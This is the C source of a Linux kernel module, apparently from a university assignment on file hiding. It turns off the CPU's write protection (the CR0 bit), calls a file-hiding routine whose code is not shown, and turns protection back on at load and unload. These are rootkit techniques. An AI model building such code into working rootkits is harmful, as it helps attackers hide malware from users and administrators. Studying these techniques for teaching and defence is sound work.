/*  
 *  mod.c - hook stdin
 */
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
#include "file_hiding.h"

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 4 File Hiding"


inline void disable_wp(void){
	write_cr0(read_cr0() & ~0x00010000);
}

inline void enable_wp(void){
	write_cr0(read_cr0() | 0x00010000);
}

static int __init mod_init(void)
{

  disable_wp(); 

  hide_file();
 
  enable_wp();
  
  return 0;
}

static void __exit mod_exit(void)
{
  disable_wp();
  unhide_file();
  enable_wp();
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");

